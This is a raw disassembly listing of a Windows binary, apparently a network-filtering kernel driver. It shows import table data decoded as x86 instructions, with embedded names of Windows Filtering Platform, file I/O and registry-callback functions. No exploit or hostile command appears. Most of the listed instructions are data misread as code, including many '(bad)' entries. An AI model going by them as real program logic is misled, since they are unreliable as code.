   140016248:	50                   	push   %rax
   140016249:	68 01 00 00 00       	push   $0x1
   14001624e:	00 00                	add    %al,(%rax)
   140016250:	5a                   	pop    %rdx
   140016251:	68 01 00 00 00       	push   $0x1
   140016256:	00 00                	add    %al,(%rax)
   140016258:	64 68 01 00 00 00    	fs push $0x1
   14001625e:	00 00                	add    %al,(%rax)
   140016260:	6e                   	outsb  (%rsi),(%dx)
   140016261:	68 01 00 00 00       	push   $0x1
   140016266:	00 00                	add    %al,(%rax)
   140016268:	78 68                	js     0x1400162d2
   14001626a:	01 00                	add    %eax,(%rax)
   14001626c:	00 00                	add    %al,(%rax)
   14001626e:	00 00                	add    %al,(%rax)
   140016270:	82                   	(bad)
   140016271:	68 01 00 00 00       	push   $0x1
   140016276:	00 00                	add    %al,(%rax)
   140016278:	8c 68 01             	mov    %gs,0x1(%rax)
   14001627b:	00 00                	add    %al,(%rax)
   14001627d:	00 00                	add    %al,(%rax)
   14001627f:	00 a0 68 01 00 00    	add    %ah,0x168(%rax)
   140016285:	00 00                	add    %al,(%rax)
   140016287:	00 aa 68 01 00 00    	add    %ch,0x168(%rdx)
   14001628d:	00 00                	add    %al,(%rax)
   14001628f:	00 b4 68 01 00 00 00 	add    %dh,0x1(%rax,%rbp,2)
   140016296:	00 00                	add    %al,(%rax)
   140016298:	8a 66 01             	mov    0x1(%rsi),%ah
   14001629b:	00 00                	add    %al,(%rax)
   14001629d:	00 00                	add    %al,(%rax)
   14001629f:	00 c8                	add    %cl,%al
   1400162a1:	68 01 00 00 00       	push   $0x1
   1400162a6:	00 00                	add    %al,(%rax)
   1400162a8:	e6 68                	out    %al,$0x68
   1400162aa:	01 00                	add    %eax,(%rax)
   1400162ac:	00 00                	add    %al,(%rax)
   1400162ae:	00 00                	add    %al,(%rax)
   1400162b0:	04 69                	add    $0x69,%al
   1400162b2:	01 00                	add    %eax,(%rax)
   1400162b4:	00 00                	add    %al,(%rax)
   1400162b6:	00 00                	add    %al,(%rax)
   1400162b8:	0e                   	(bad)
   1400162b9:	69 01 00 00 00 00    	imul   $0x0,(%rcx),%eax
   1400162bf:	00 2e                	add    %ch,(%rsi)
   1400162c1:	69 01 00 00 00 00    	imul   $0x0,(%rcx),%eax
   1400162c7:	00 46 69             	add    %al,0x69(%rsi)
   1400162ca:	01 00                	add    %eax,(%rax)
   1400162cc:	00 00                	add    %al,(%rax)
   1400162ce:	00 00                	add    %al,(%rax)
   1400162d0:	64 69 01 00 00 00 00 	imul   $0x0,%fs:(%rcx),%eax
   1400162d7:	00 84 69 01 00 00 00 	add    %al,0x1(%rcx,%rbp,2)
   1400162de:	00 00                	add    %al,(%rax)
   1400162e0:	94                   	xchg   %eax,%esp
   1400162e1:	69 01 00 00 00 00    	imul   $0x0,(%rcx),%eax
   1400162e7:	00 aa 69 01 00 00    	add    %ch,0x169(%rdx)
   1400162ed:	00 00                	add    %al,(%rax)
   1400162ef:	00 ba 69 01 00 00    	add    %bh,0x169(%rdx)
   1400162f5:	00 00                	add    %al,(%rax)
   1400162f7:	00 d2                	add    %dl,%dl
   1400162f9:	69 01 00 00 00 00    	imul   $0x0,(%rcx),%eax
   1400162ff:	00 e0                	add    %ah,%al
   140016301:	69 01 00 00 00 00    	imul   $0x0,(%rcx),%eax
   140016307:	00 ec                	add    %ch,%ah
   140016309:	69 01 00 00 00 00    	imul   $0x0,(%rcx),%eax
   14001630f:	00 fa                	add    %bh,%dl
   140016311:	69 01 00 00 00 00    	imul   $0x0,(%rcx),%eax
   140016317:	00 0c 6a             	add    %cl,(%rdx,%rbp,2)
   14001631a:	01 00                	add    %eax,(%rax)
   14001631c:	00 00                	add    %al,(%rax)
   14001631e:	00 00                	add    %al,(%rax)
   140016320:	1c 6a                	sbb    $0x6a,%al
   140016322:	01 00                	add    %eax,(%rax)
   140016324:	00 00                	add    %al,(%rax)
   140016326:	00 00                	add    %al,(%rax)
   140016328:	36 6a 01             	ss push $0x1
   14001632b:	00 00                	add    %al,(%rax)
   14001632d:	00 00                	add    %al,(%rax)
   14001632f:	00 46 6a             	add    %al,0x6a(%rsi)
   140016332:	01 00                	add    %eax,(%rax)
   140016334:	00 00                	add    %al,(%rax)
   140016336:	00 00                	add    %al,(%rax)
   140016338:	66 6a 01             	pushw  $0x1
   14001633b:	00 00                	add    %al,(%rax)
   14001633d:	00 00                	add    %al,(%rax)
   14001633f:	00 76 6a             	add    %dh,0x6a(%rsi)
   140016342:	01 00                	add    %eax,(%rax)
   140016344:	00 00                	add    %al,(%rax)
   140016346:	00 00                	add    %al,(%rax)
   140016348:	90                   	nop
   140016349:	6a 01                	push   $0x1
   14001634b:	00 00                	add    %al,(%rax)
   14001634d:	00 00                	add    %al,(%rax)
   14001634f:	00 b0 6a 01 00 00    	add    %dh,0x16a(%rax)
   140016355:	00 00                	add    %al,(%rax)
   140016357:	00 ce                	add    %cl,%dh
   140016359:	6a 01                	push   $0x1
   14001635b:	00 00                	add    %al,(%rax)
   14001635d:	00 00                	add    %al,(%rax)
   14001635f:	00 e6                	add    %ah,%dh
   140016361:	6a 01                	push   $0x1
   140016363:	00 00                	add    %al,(%rax)
   140016365:	00 00                	add    %al,(%rax)
   140016367:	00 fe                	add    %bh,%dh
   140016369:	6a 01                	push   $0x1
   14001636b:	00 00                	add    %al,(%rax)
   14001636d:	00 00                	add    %al,(%rax)
   14001636f:	00 14 6b             	add    %dl,(%rbx,%rbp,2)
   140016372:	01 00                	add    %eax,(%rax)
   140016374:	00 00                	add    %al,(%rax)
   140016376:	00 00                	add    %al,(%rax)
   140016378:	30 6b 01             	xor    %ch,0x1(%rbx)
   14001637b:	00 00                	add    %al,(%rax)
   14001637d:	00 00                	add    %al,(%rax)
   14001637f:	00 40 6b             	add    %al,0x6b(%rax)
   140016382:	01 00                	add    %eax,(%rax)
   140016384:	00 00                	add    %al,(%rax)
   140016386:	00 00                	add    %al,(%rax)
   140016388:	4c 6b 01 00          	imul   $0x0,(%rcx),%r8
   14001638c:	00 00                	add    %al,(%rax)
   14001638e:	00 00                	add    %al,(%rax)
   140016390:	56                   	push   %rsi
   140016391:	6b 01 00             	imul   $0x0,(%rcx),%eax
   140016394:	00 00                	add    %al,(%rax)
   140016396:	00 00                	add    %al,(%rax)
   140016398:	62 6b 01 00 00       	(bad)
   14001639d:	00 00                	add    %al,(%rax)
   14001639f:	00 78 6b             	add    %bh,0x6b(%rax)
   1400163a2:	01 00                	add    %eax,(%rax)
   1400163a4:	00 00                	add    %al,(%rax)
   1400163a6:	00 00                	add    %al,(%rax)
   1400163a8:	88 6b 01             	mov    %ch,0x1(%rbx)
   1400163ab:	00 00                	add    %al,(%rax)
   1400163ad:	00 00                	add    %al,(%rax)
   1400163af:	00 98 6b 01 00 00    	add    %bl,0x16b(%rax)
   1400163b5:	00 00                	add    %al,(%rax)
   1400163b7:	00 a4 6b 01 00 00 00 	add    %ah,0x1(%rbx,%rbp,2)
   1400163be:	00 00                	add    %al,(%rax)
   1400163c0:	b2 6b                	mov    $0x6b,%dl
   1400163c2:	01 00                	add    %eax,(%rax)
   1400163c4:	00 00                	add    %al,(%rax)
   1400163c6:	00 00                	add    %al,(%rax)
   1400163c8:	9a                   	(bad)
   1400163c9:	66 01 00             	add    %ax,(%rax)
   1400163cc:	00 00                	add    %al,(%rax)
   1400163ce:	00 00                	add    %al,(%rax)
   1400163d0:	72 66                	jb     0x140016438
   1400163d2:	01 00                	add    %eax,(%rax)
   1400163d4:	00 00                	add    %al,(%rax)
   1400163d6:	00 00                	add    %al,(%rax)
   1400163d8:	5a                   	pop    %rdx
   1400163d9:	66 01 00             	add    %ax,(%rax)
   1400163dc:	00 00                	add    %al,(%rax)
   1400163de:	00 00                	add    %al,(%rax)
   1400163e0:	4c                   	rex.WR
   1400163e1:	66 01 00             	add    %ax,(%rax)
   1400163e4:	00 00                	add    %al,(%rax)
   1400163e6:	00 00                	add    %al,(%rax)
   1400163e8:	38 66 01             	cmp    %ah,0x1(%rsi)
   1400163eb:	00 00                	add    %al,(%rax)
   1400163ed:	00 00                	add    %al,(%rax)
   1400163ef:	00 20                	add    %ah,(%rax)
   1400163f1:	66 01 00             	add    %ax,(%rax)
   1400163f4:	00 00                	add    %al,(%rax)
   1400163f6:	00 00                	add    %al,(%rax)
   1400163f8:	30 6c 01 00          	xor    %ch,0x0(%rcx,%rax,1)
   1400163fc:	00 00                	add    %al,(%rax)
   1400163fe:	00 00                	add    %al,(%rax)
   140016400:	40 6c                	rex insb (%dx),(%rdi)
   140016402:	01 00                	add    %eax,(%rax)
   140016404:	00 00                	add    %al,(%rax)
   140016406:	00 00                	add    %al,(%rax)
   140016408:	0c 66                	or     $0x66,%al
   14001640a:	01 00                	add    %eax,(%rax)
   14001640c:	00 00                	add    %al,(%rax)
   14001640e:	00 00                	add    %al,(%rax)
   140016410:	f4                   	hlt
   140016411:	65 01 00             	add    %eax,%gs:(%rax)
   140016414:	00 00                	add    %al,(%rax)
   140016416:	00 00                	add    %al,(%rax)
   140016418:	ea                   	(bad)
   140016419:	65 01 00             	add    %eax,%gs:(%rax)
   14001641c:	00 00                	add    %al,(%rax)
   14001641e:	00 00                	add    %al,(%rax)
   140016420:	be 68 01 00 00       	mov    $0x168,%esi
	...
   14001642d:	00 00                	add    %al,(%rax)
   14001642f:	00 a3 00 46 77 70    	add    %ah,0x70774600(%rbx)
   140016435:	73 43                	jae    0x14001647a
   140016437:	61                   	(bad)
   140016438:	6c                   	insb   (%dx),(%rdi)
   140016439:	6c                   	insb   (%dx),(%rdi)
   14001643a:	6f                   	outsl  (%rsi),(%dx)
   14001643b:	75 74                	jne    0x1400164b1
   14001643d:	52                   	push   %rdx
   14001643e:	65 67 69 73 74 65 72 	imul   $0x317265,%gs:0x74(%ebx),%esi
   140016445:	31 00 
   140016447:	00 a7 00 46 77 70    	add    %ah,0x70774600(%rdi)
   14001644d:	73 43                	jae    0x140016492
   14001644f:	61                   	(bad)
   140016450:	6c                   	insb   (%dx),(%rdi)
   140016451:	6c                   	insb   (%dx),(%rdi)
   140016452:	6f                   	outsl  (%rsi),(%dx)
   140016453:	75 74                	jne    0x1400164c9
   140016455:	55                   	push   %rbp
   140016456:	6e                   	outsb  (%rsi),(%dx)
   140016457:	72 65                	jb     0x1400164be
   140016459:	67 69 73 74 65 72 42 	imul   $0x79427265,0x74(%ebx),%esi
   140016460:	79 
   140016461:	49                   	rex.WB
   140016462:	64 30 00             	xor    %al,%fs:(%rax)
   140016465:	00 2d 00 46 77 70    	add    %ch,0x70774600(%rip)        # 0x1b078aa6b
   14001646b:	6d                   	insl   (%dx),(%rdi)
   14001646c:	45 6e                	rex.RB outsb (%rsi),(%dx)
   14001646e:	67 69 6e 65 4f 70 65 	imul   $0x6e65704f,0x65(%esi),%ebp
   140016475:	6e 
   140016476:	30 00                	xor    %al,(%rax)
   140016478:	2a 00                	sub    (%rax),%al
   14001647a:	46 77 70             	rex.RX ja 0x1400164ed
   14001647d:	6d                   	insl   (%dx),(%rdi)
   14001647e:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140016480:	67 69 6e 65 43 6c 6f 	imul   $0x736f6c43,0x65(%esi),%ebp
   140016487:	73 
   140016488:	65 30 00             	xor    %al,%gs:(%rax)
   14001648b:	00 76 00             	add    %dh,0x0(%rsi)
   14001648e:	46 77 70             	rex.RX ja 0x140016501
   140016491:	6d                   	insl   (%dx),(%rdi)
   140016492:	54                   	push   %rsp
   140016493:	72 61                	jb     0x1400164f6
   140016495:	6e                   	outsb  (%rsi),(%dx)
   140016496:	73 61                	jae    0x1400164f9
   140016498:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   14001649c:	6e                   	outsb  (%rsi),(%dx)
   14001649d:	42                   	rex.X
   14001649e:	65 67 69 6e 30 00 77 	imul   $0x46007700,%gs:0x30(%esi),%ebp
   1400164a5:	00 46 
   1400164a7:	77 70                	ja     0x140016519
   1400164a9:	6d                   	insl   (%dx),(%rdi)
   1400164aa:	54                   	push   %rsp
   1400164ab:	72 61                	jb     0x14001650e
   1400164ad:	6e                   	outsb  (%rsi),(%dx)
   1400164ae:	73 61                	jae    0x140016511
   1400164b0:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   1400164b4:	6e                   	outsb  (%rsi),(%dx)
   1400164b5:	43 6f                	rex.XB outsl (%rsi),(%dx)
   1400164b7:	6d                   	insl   (%dx),(%rdi)
   1400164b8:	6d                   	insl   (%dx),(%rdi)
   1400164b9:	69 74 30 00 00 75 00 	imul   $0x46007500,0x0(%rax,%rsi,1),%esi
   1400164c0:	46 
   1400164c1:	77 70                	ja     0x140016533
   1400164c3:	6d                   	insl   (%dx),(%rdi)
   1400164c4:	54                   	push   %rsp
   1400164c5:	72 61                	jb     0x140016528
   1400164c7:	6e                   	outsb  (%rsi),(%dx)
   1400164c8:	73 61                	jae    0x14001652b
   1400164ca:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   1400164ce:	6e                   	outsb  (%rsi),(%dx)
   1400164cf:	41 62 6f 72 74 30    	(bad)
   1400164d5:	00 6d 00             	add    %ch,0x0(%rbp)
   1400164d8:	46 77 70             	rex.RX ja 0x14001654b
   1400164db:	6d                   	insl   (%dx),(%rdi)
   1400164dc:	53                   	push   %rbx
   1400164dd:	75 62                	jne    0x140016541
   1400164df:	4c 61                	rex.WR (bad)
   1400164e1:	79 65                	jns    0x140016548
   1400164e3:	72 41                	jb     0x140016526
   1400164e5:	64 64 30 00          	fs xor %al,%fs:(%rax)
   1400164e9:	00 6f 00             	add    %ch,0x0(%rdi)
   1400164ec:	46 77 70             	rex.RX ja 0x14001655f
   1400164ef:	6d                   	insl   (%dx),(%rdi)
   1400164f0:	53                   	push   %rbx
   1400164f1:	75 62                	jne    0x140016555
   1400164f3:	4c 61                	rex.WR (bad)
   1400164f5:	79 65                	jns    0x14001655c
   1400164f7:	72 44                	jb     0x14001653d
   1400164f9:	65 6c                	gs insb (%dx),(%rdi)
   1400164fb:	65 74 65             	gs je  0x140016563
   1400164fe:	42 79 4b             	rex.X jns 0x14001654c
   140016501:	65 79 30             	gs jns 0x140016534
   140016504:	00 00                	add    %al,(%rax)
   140016506:	19 00                	sbb    %eax,(%rax)
   140016508:	46 77 70             	rex.RX ja 0x14001657b
   14001650b:	6d                   	insl   (%dx),(%rdi)
   14001650c:	43 61                	rex.XB (bad)
   14001650e:	6c                   	insb   (%dx),(%rdi)
   14001650f:	6c                   	insb   (%dx),(%rdi)
   140016510:	6f                   	outsl  (%rsi),(%dx)
   140016511:	75 74                	jne    0x140016587
   140016513:	41                   	rex.B
   140016514:	64 64 30 00          	fs xor %al,%fs:(%rax)
   140016518:	30 00                	xor    %al,(%rax)
   14001651a:	46 77 70             	rex.RX ja 0x14001658d
   14001651d:	6d                   	insl   (%dx),(%rdi)
   14001651e:	46 69 6c 74 65 72 41 	imul   $0x64644172,0x65(%rsp,%r14,2),%r13d
   140016525:	64 64 
   140016527:	30 00                	xor    %al,(%rax)
   140016529:	00 32                	add    %dh,(%rdx)
   14001652b:	00 46 77             	add    %al,0x77(%rsi)
   14001652e:	70 6d                	jo     0x14001659d
   140016530:	46 69 6c 74 65 72 44 	imul   $0x6c654472,0x65(%rsp,%r14,2),%r13d
   140016537:	65 6c 
   140016539:	65 74 65             	gs je  0x1400165a1
   14001653c:	42 79 49             	rex.X jns 0x140016588
   14001653f:	64 30 00             	xor    %al,%fs:(%rax)
   140016542:	96                   	xchg   %eax,%esi
   140016543:	00 46 77             	add    %al,0x77(%rsi)
   140016546:	70 73                	jo     0x1400165bb
   140016548:	41 63 71 75          	movsxd 0x75(%r9),%esi
   14001654c:	69 72 65 43 6c 61 73 	imul   $0x73616c43,0x65(%rdx),%esi
   140016553:	73 69                	jae    0x1400165be
   140016555:	66 79 48             	data16 jns 0x1400165a0
   140016558:	61                   	(bad)
   140016559:	6e                   	outsb  (%rsi),(%dx)
   14001655a:	64 6c                	fs insb (%dx),(%rdi)
   14001655c:	65 30 00             	xor    %al,%gs:(%rax)
   14001655f:	00 e0                	add    %ah,%al
   140016561:	00 46 77             	add    %al,0x77(%rsi)
   140016564:	70 73                	jo     0x1400165d9
   140016566:	52                   	push   %rdx
   140016567:	65 6c                	gs insb (%dx),(%rdi)
   140016569:	65 61                	gs (bad)
   14001656b:	73 65                	jae    0x1400165d2
   14001656d:	43 6c                	rex.XB insb (%dx),(%rdi)
   14001656f:	61                   	(bad)
   140016570:	73 73                	jae    0x1400165e5
   140016572:	69 66 79 48 61 6e 64 	imul   $0x646e6148,0x79(%rsi),%esp
   140016579:	6c                   	insb   (%dx),(%rdi)
   14001657a:	65 30 00             	xor    %al,%gs:(%rax)
   14001657d:	00 ac 00 46 77 70 73 	add    %ch,0x73707746(%rax,%rax,1)
   140016584:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140016586:	6d                   	insl   (%dx),(%rdi)
   140016587:	70 6c                	jo     0x1400165f5
   140016589:	65 74 65             	gs je  0x1400165f1
   14001658c:	43 6c                	rex.XB insb (%dx),(%rdi)
   14001658e:	61                   	(bad)
   14001658f:	73 73                	jae    0x140016604
   140016591:	69 66 79 30 00 97 00 	imul   $0x970030,0x79(%rsi),%esp
   140016598:	46 77 70             	rex.RX ja 0x14001660b
   14001659b:	73 41                	jae    0x1400165de
   14001659d:	63 71 75             	movsxd 0x75(%rcx),%esi
   1400165a0:	69 72 65 57 72 69 74 	imul   $0x74697257,0x65(%rdx),%esi
   1400165a7:	61                   	(bad)
   1400165a8:	62 6c 65 4c 61       	(bad)
   1400165ad:	79 65                	jns    0x140016614
   1400165af:	72 44                	jb     0x1400165f5
   1400165b1:	61                   	(bad)
   1400165b2:	74 61                	je     0x140016615
   1400165b4:	50                   	push   %rax
   1400165b5:	6f                   	outsl  (%rsi),(%dx)
   1400165b6:	69 6e 74 65 72 30 00 	imul   $0x307265,0x74(%rsi),%ebp
   1400165bd:	00 a1 00 46 77 70    	add    %ah,0x70774600(%rcx)
   1400165c3:	73 41                	jae    0x140016606
   1400165c5:	70 70                	jo     0x140016637
   1400165c7:	6c                   	insb   (%dx),(%rdi)
   1400165c8:	79 4d                	jns    0x140016617
   1400165ca:	6f                   	outsl  (%rsi),(%dx)
   1400165cb:	64 69 66 69 65 64 4c 	imul   $0x614c6465,%fs:0x69(%rsi),%esp
   1400165d2:	61 
   1400165d3:	79 65                	jns    0x14001663a
   1400165d5:	72 44                	jb     0x14001661b
   1400165d7:	61                   	(bad)
   1400165d8:	74 61                	je     0x14001663b
   1400165da:	30 00                	xor    %al,(%rax)
   1400165dc:	66 77 70             	data16 ja 0x14001664f
   1400165df:	6b 63 6c 6e          	imul   $0x6e,0x6c(%rbx),%esp
   1400165e3:	74 2e                	je     0x140016613
   1400165e5:	73 79                	jae    0x140016660
   1400165e7:	73 00                	jae    0x1400165e9
   1400165e9:	00 c3                	add    %al,%bl
   1400165eb:	0b 73 74             	or     0x74(%rbx),%esi
   1400165ee:	72 63                	jb     0x140016653
   1400165f0:	70 79                	jo     0x14001666b
   1400165f2:	00 00                	add    %al,(%rax)
   1400165f4:	7f 08                	jg     0x1400165fe
   1400165f6:	52                   	push   %rdx
   1400165f7:	74 6c                	je     0x140016665
   1400165f9:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400165fb:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%rbp,%rdx,2),%esi
   140016602:	64 
   140016603:	65 53                	gs push %rbx
   140016605:	74 72                	je     0x140016679
   140016607:	69 6e 67 00 00 ca 00 	imul   $0xca0000,0x67(%rsi),%ebp
   14001660e:	45 78 46             	rex.RB js 0x140016657
   140016611:	72 65                	jb     0x140016678
   140016613:	65 50                	gs push %rax
   140016615:	6f                   	outsl  (%rsi),(%dx)
   140016616:	6f                   	outsl  (%rsi),(%dx)
   140016617:	6c                   	insb   (%dx),(%rdi)
   140016618:	57                   	push   %rdi
   140016619:	69 74 68 54 61 67 00 	imul   $0x6006761,0x54(%rax,%rbp,2),%esi
   140016620:	06 
   140016621:	03 49 6f             	add    0x6f(%rcx),%ecx
   140016624:	44                   	rex.R
   140016625:	65 6c                	gs insb (%dx),(%rdi)
   140016627:	65 74 65             	gs je  0x14001668f
   14001662a:	53                   	push   %rbx
   14001662b:	79 6d                	jns    0x14001669a
   14001662d:	62 6f 6c 69 63       	(bad)
   140016632:	4c 69 6e 6b 00 00 83 	imul   $0x4830000,0x6b(%rsi),%r13
   140016639:	04 
   14001663a:	4b                   	rex.WXB
   14001663b:	65 49 6e             	rex.WB outsb %gs:(%rsi),(%dx)
   14001663e:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   140016645:	65 
   140016646:	45 76 65             	rex.RB jbe 0x1400166ae
   140016649:	6e                   	outsb  (%rsi),(%dx)
   14001664a:	74 00                	je     0x14001664c
   14001664c:	05 05 4b 65 53       	add    $0x53654b05,%eax
   140016651:	65 74 45             	gs je  0x140016699
   140016654:	76 65                	jbe    0x1400166bb
   140016656:	6e                   	outsb  (%rsi),(%dx)
   140016657:	74 00                	je     0x140016659
   140016659:	00 30                	add    %dh,(%rax)
   14001665b:	05 4b 65 57 61       	add    $0x6157654b,%eax
   140016660:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%rsi,%rax,2),%esi
   140016667:	6e 
   140016668:	67 6c                	insb   (%dx),(%edi)
   14001666a:	65 4f 62 6a 65 63 74 	(bad)
   140016671:	00 a3 00 45 78 41    	add    %ah,0x41784500(%rbx)
   140016677:	6c                   	insb   (%dx),(%rdi)
   140016678:	6c                   	insb   (%dx),(%rdi)
   140016679:	6f                   	outsl  (%rsi),(%dx)
   14001667a:	63 61 74             	movsxd 0x74(%rcx),%esp
   14001667d:	65 50                	gs push %rax
   14001667f:	6f                   	outsl  (%rsi),(%dx)
   140016680:	6f                   	outsl  (%rsi),(%dx)
   140016681:	6c                   	insb   (%dx),(%rdi)
   140016682:	57                   	push   %rdi
   140016683:	69 74 68 54 61 67 00 	imul   $0xc2006761,0x54(%rax,%rbp,2),%esi
   14001668a:	c2 
   14001668b:	02 49 6f             	add    0x6f(%rcx),%cl
   14001668e:	41 6c                	rex.B insb (%dx),(%rdi)
   140016690:	6c                   	insb   (%dx),(%rdi)
   140016691:	6f                   	outsl  (%rsi),(%dx)
   140016692:	63 61 74             	movsxd 0x74(%rcx),%esp
   140016695:	65 49 72 70          	gs rex.WB jb 0x140016709
   140016699:	00 0d 04 49 6f 66    	add    %cl,0x666f4904(%rip)        # 0x1a670afa3
   14001669f:	43 61                	rex.XB (bad)
   1400166a1:	6c                   	insb   (%dx),(%rdi)
   1400166a2:	6c                   	insb   (%dx),(%rdi)
   1400166a3:	44 72 69             	rex.R jb 0x14001670f
   1400166a6:	76 65                	jbe    0x14001670d
   1400166a8:	72 00                	jb     0x1400166aa
   1400166aa:	f0 02 49 6f          	lock add 0x6f(%rcx),%cl
   1400166ae:	43 72 65             	rex.XB jb 0x140016716
   1400166b1:	61                   	(bad)
   1400166b2:	74 65                	je     0x140016719
   1400166b4:	46 69 6c 65 00 00 1a 	imul   $0x49031a00,0x0(%rbp,%r12,2),%r13d
   1400166bb:	03 49 
   1400166bd:	6f                   	outsl  (%rsi),(%dx)
   1400166be:	46 72 65             	rex.RX jb 0x140016726
   1400166c1:	65 49 72 70          	gs rex.WB jb 0x140016735
   1400166c5:	00 49 03             	add    %cl,0x3(%rcx)
   1400166c8:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400166ca:	47                   	rex.RXB
   1400166cb:	65 74 52             	gs je  0x140016720
   1400166ce:	65 6c                	gs insb (%dx),(%rdi)
   1400166d0:	61                   	(bad)
   1400166d1:	74 65                	je     0x140016738
   1400166d3:	64 44                	fs rex.R
   1400166d5:	65 76 69             	gs jbe 0x140016741
   1400166d8:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   1400166db:	62 6a 65 63 74       	(bad)
   1400166e0:	00 00                	add    %al,(%rax)
   1400166e2:	63 06                	movsxd (%rsi),%eax
   1400166e4:	4f 62 52 65 66 65    	(bad)
   1400166ea:	72 65                	jb     0x140016751
   1400166ec:	6e                   	outsb  (%rsi),(%dx)
   1400166ed:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   1400166f0:	62 6a 65 63 74       	(bad)
   1400166f5:	42 79 48             	rex.X jns 0x140016740
   1400166f8:	61                   	(bad)
   1400166f9:	6e                   	outsb  (%rsi),(%dx)
   1400166fa:	64 6c                	fs insb (%dx),(%rdi)
   1400166fc:	65 00 73 06          	add    %dh,%gs:0x6(%rbx)
   140016700:	4f 62 66 44 65 72    	(bad)
   140016706:	65 66 65 72 65       	gs data16 gs jb 0x140016770
   14001670b:	6e                   	outsb  (%rsi),(%dx)
   14001670c:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14001670f:	62 6a 65 63 74       	(bad)
   140016714:	00 00                	add    %al,(%rax)
   140016716:	01 0b                	add    %ecx,(%rbx)
   140016718:	5a                   	pop    %rdx
   140016719:	77 51                	ja     0x14001676c
   14001671b:	75 65                	jne    0x140016782
   14001671d:	72 79                	jb     0x140016798
   14001671f:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140016721:	66 6f                	outsw  (%rsi),(%dx)
   140016723:	72 6d                	jb     0x140016792
   140016725:	61                   	(bad)
   140016726:	74 69                	je     0x140016791
   140016728:	6f                   	outsl  (%rsi),(%dx)
   140016729:	6e                   	outsb  (%rsi),(%dx)
   14001672a:	46 69 6c 65 00 00 3a 	imul   $0x5a0b3a00,0x0(%rbp,%r12,2),%r13d
   140016731:	0b 5a 
   140016733:	77 53                	ja     0x140016788
   140016735:	65 74 49             	gs je  0x140016781
   140016738:	6e                   	outsb  (%rsi),(%dx)
   140016739:	66 6f                	outsw  (%rsi),(%dx)
   14001673b:	72 6d                	jb     0x1400167aa
   14001673d:	61                   	(bad)
   14001673e:	74 69                	je     0x1400167a9
   140016740:	6f                   	outsl  (%rsi),(%dx)
   140016741:	6e                   	outsb  (%rsi),(%dx)
   140016742:	46 69 6c 65 00 00 1c 	imul   $0x5a0b1c00,0x0(%rbp,%r12,2),%r13d
   140016749:	0b 5a 
   14001674b:	77 52                	ja     0x14001679f
   14001674d:	65 61                	gs (bad)
   14001674f:	64 46 69 6c 65 00 00 	imul   $0x5a0b6300,%fs:0x0(%rbp,%r12,2),%r13d
   140016756:	63 0b 5a 
   140016759:	77 57                	ja     0x1400167b2
   14001675b:	72 69                	jb     0x1400167c6
   14001675d:	74 65                	je     0x1400167c4
   14001675f:	46 69 6c 65 00 89 0a 	imul   $0x775a0a89,0x0(%rbp,%r12,2),%r13d
   140016766:	5a 77 
   140016768:	43 6c                	rex.XB insb (%dx),(%rdi)
   14001676a:	6f                   	outsl  (%rsi),(%dx)
   14001676b:	73 65                	jae    0x1400167d2
   14001676d:	00 13                	add    %dl,(%rbx)
   14001676f:	03 49 6f             	add    0x6f(%rcx),%ecx
   140016772:	46 69 6c 65 4f 62 6a 	imul   $0x63656a62,0x4f(%rbp,%r12,2),%r13d
   140016779:	65 63 
   14001677b:	74 54                	je     0x1400167d1
   14001677d:	79 70                	jns    0x1400167ef
   14001677f:	65 00 00             	add    %al,%gs:(%rax)
   140016782:	59                   	pop    %rcx
   140016783:	04 4b                	add    $0x4b,%al
   140016785:	65 45 6e             	rex.RB outsb %gs:(%rsi),(%dx)
   140016788:	74 65                	je     0x1400167ef
   14001678a:	72 43                	jb     0x1400167cf
   14001678c:	72 69                	jb     0x1400167f7
   14001678e:	74 69                	je     0x1400167f9
   140016790:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   140016793:	52                   	push   %rdx
   140016794:	65 67 69 6f 6e 00 a5 	imul   $0x4b04a500,%gs:0x6e(%edi),%ebp
   14001679b:	04 4b 
   14001679d:	65 4c                	gs rex.WR
   14001679f:	65 61                	gs (bad)
   1400167a1:	76 65                	jbe    0x140016808
   1400167a3:	43 72 69             	rex.XB jb 0x14001680f
   1400167a6:	74 69                	je     0x140016811
   1400167a8:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   1400167ab:	52                   	push   %rdx
   1400167ac:	65 67 69 6f 6e 00 89 	imul   $0x50078900,%gs:0x6e(%edi),%ebp
   1400167b3:	07 50 
   1400167b5:	73 54                	jae    0x14001680b
   1400167b7:	65 72 6d             	gs jb  0x140016827
   1400167ba:	69 6e 61 74 65 53 79 	imul   $0x79536574,0x61(%rsi),%ebp
   1400167c1:	73 74                	jae    0x140016837
   1400167c3:	65 6d                	gs insl (%dx),(%rdi)
   1400167c5:	54                   	push   %rsp
   1400167c6:	68 72 65 61 64       	push   $0x64616572
   1400167cb:	00 02                	add    %al,(%rdx)
   1400167cd:	05 4b 65 53 65       	add    $0x6553654b,%eax
   1400167d2:	74 42                	je     0x140016816
   1400167d4:	61                   	(bad)
   1400167d5:	73 65                	jae    0x14001683c
   1400167d7:	50                   	push   %rax
   1400167d8:	72 69                	jb     0x140016843
   1400167da:	6f                   	outsl  (%rsi),(%dx)
   1400167db:	72 69                	jb     0x140016846
   1400167dd:	74 79                	je     0x140016858
   1400167df:	54                   	push   %rsp
   1400167e0:	68 72 65 61 64       	push   $0x64616572
   1400167e5:	00 b9 0b 73 70 72    	add    %bh,0x7270730b(%rcx)
   1400167eb:	69 6e 74 66 00 57 00 	imul   $0x570066,0x74(%rsi),%ebp
   1400167f2:	43 6d                	rex.XB insl (%dx),(%rdi)
   1400167f4:	55                   	push   %rbp
   1400167f5:	6e                   	outsb  (%rsi),(%dx)
   1400167f6:	52                   	push   %rdx
   1400167f7:	65 67 69 73 74 65 72 	imul   $0x61437265,%gs:0x74(%ebx),%esi
   1400167fe:	43 61 
